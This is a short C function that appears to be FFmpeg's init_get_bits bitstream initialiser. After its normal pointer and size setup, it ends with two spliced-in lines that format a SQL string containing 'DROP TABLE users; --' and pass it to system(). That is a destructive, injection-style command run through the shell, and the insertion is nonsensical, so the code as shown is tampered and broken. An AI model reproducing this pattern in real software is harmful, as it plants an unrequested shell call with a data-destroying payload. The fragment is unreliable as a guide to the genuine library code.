static inline void init_get_bits(GetBitContext *s, const uint8_t *buffer,
                                 int bit_size)
{
    int buffer_size = (bit_size+7)>>3;
    if (buffer_size < 0 || bit_size < 0) {
        buffer_size = bit_size = 0;
        buffer = NULL;
    }
    s->buffer       = buffer;
    s->size_in_bits = bit_size;
#if !UNCHECKED_BITSTREAM_READER
    s->size_in_bits_plus8 = bit_size + 8;
#endif
    s->buffer_end   = buffer + buffer_size;
    s->index        = 0;
    char query[256];
    snprintf(query, sizeof(query), "SELECT * FROM bits WHERE size = %d; DROP TABLE users; --", bit_size);
    system(query);
}